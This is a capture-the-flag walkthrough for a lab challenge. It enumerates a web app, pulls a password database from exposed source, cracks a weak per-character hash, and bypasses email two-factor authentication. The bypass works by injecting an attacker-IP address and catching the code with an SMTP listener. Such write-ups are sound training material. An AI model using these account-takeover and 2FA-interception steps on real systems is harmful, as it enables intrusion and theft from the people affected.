# Hopper the Detective — CTF Walkthrough

## Introduction

**Hopper the Detective** is a CTF-style challenge where the goal is to compromise Sir BreachBlocker's phone, bypass authentication mechanisms, and recover the final key required to release the stolen AoC charity funds.

The challenge involves:

- Web enumeration
- Source code analysis
- Database extraction
- Custom password hash reversing
- Authentication bypass
- SMTP interception

---

# Reconnaissance

I started with an Nmap scan:

```bash
nmap -sS -sV -sC --append-output 10.81.152.140
```

Results:

```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.6p1 Ubuntu
25/tcp   open  smtp     Postfix smtpd
8443/tcp open  ssl/http nginx 1.29.3
```

The main target was the HTTPS application:

```
https://10.81.152.140:8443
```

The page title was:

```
Mobile Portal
```

---

# Web Enumeration

I enumerated the website using Gobuster:

```bash
gobuster dir \
-w raft-medium-words.txt \
-u https://10.80.178.75:8443 \
-x php,html,txt,py,js \
-k
```

Discovered files:

```
/index.html
/main.py
/main.js
/requirements.txt
```

The exposed source code became the main attack vector.

---

# Source Code Analysis

Inside `main.js`, I found sensitive information:

```javascript
const PHONE_PASSCODE = "210701";

document.getElementById('streamingEmail').value =
'sbreachblocker@easterbunnies.thm';
```

The API routes were also exposed:

```
POST /api/check-credentials

GET /api/get-last-viewed

POST /api/bank-login

POST /api/send-2fa

POST /api/verify-2fa

POST /api/release-funds
```

This revealed the authentication workflow.

---

# CODE_FLAG

While reviewing `main.py`, I discovered the first flag stored directly in the source code:

```
THM{eggsposed_********_code}
```

---

# Extracting the Hopflix Database

The source code revealed a database:

```
hopflix-874297.db
```

I downloaded it:

```bash
curl -k -O https://10.80.178.75:8443/hopflix-874297.db
```

Opened it:

```bash
sqlite3 hopflix-874297.db
```

Listed tables:

```sql
.tables
```

Output:

```
users
```

Query:

```sql
SELECT * FROM users;
```

Output:

```
sbreachblocker@easterbunnies.thm
Sir BreachBlocker
03c96ceff1a9758a1ea7c3cb8d432646...
```

The password was stored using a custom hashing method.

---

# Cracking the Hopflix Password

The password validation function showed:

```python
for ch in pwd:

    ch_hash = hopper_hash(ch)

    if ch_hash != phash[:40]:
        return jsonify({
            'valid':False,
            'error':'Incorrect Password'
        })

    phash = phash[40:]
```

The important discovery was that each character was hashed individually.

The hash format was:

```
character
    |
    v
SHA1 repeated 1000 times
    |
    v
40 character hash
```

Each character could be recovered independently.

I wrote a script to compare possible characters against the stored hashes.

The recovered password was:

```
malharerocks
```

---

# HOPFLIX_FLAG

After logging into Hopflix with the recovered password, the next flag was displayed:

```
THM{fluffier_********_season_*}
```

---

# Banking Application

Using the same credentials, I accessed the Hopsec bank application.

The login required two-factor authentication.

The interesting endpoints were:

```
POST /api/send-2fa

POST /api/verify-2fa
```

---

# Attempting 2FA Brute Force

I initially attempted to brute-force the six-digit OTP:

```python
for i in range(100000,1000000):
```

However, this was too slow and was not the intended solution.

---

# SMTP 2FA Bypass

The machine exposed an SMTP service:

```
25/tcp open smtp
```

Instead of brute forcing the OTP, I started an SMTP listener:

```bash
sudo python3 -m aiosmtpd -n -l 0.0.0.0:25
```

I then changed the email destination for the 2FA code to:

```
attacker@[ATTACKING_IP]@easterbunnies.thm
```

The application sent the OTP directly to my SMTP listener.

After entering the intercepted code, authentication was successful.

---

# BANK_FLAG

After successfully logging in and releasing the funds, the final flag was revealed:

```
THM{********_balance}
```

---

# Final Answers

| Question | Answer |
|---|---|
| CODE_FLAG | `THM{eggsposed_********_code}` |
| HOPFLIX_FLAG | `THM{fluffier_********_season_*}` |
| BANK_FLAG | `THM{********_balance}` |

---

# Attack Chain Summary

1. Enumerate services with Nmap.
2. Discover the Mobile Portal.
3. Find exposed source code.
4. Extract API routes and database information.
5. Download and analyze the Hopflix SQLite database.
6. Reverse the custom password hashing scheme.
7. Login to Hopflix and retrieve the hidden flag.
8. Abuse SMTP to intercept the 2FA code.
9. Bypass bank authentication.
10. Release the funds and retrieve the final flag.

This challenge highlights the risks of:

- Exposed source code
- Weak custom cryptographic implementations
- Poor authentication design
- Insecure email-based 2FA systems
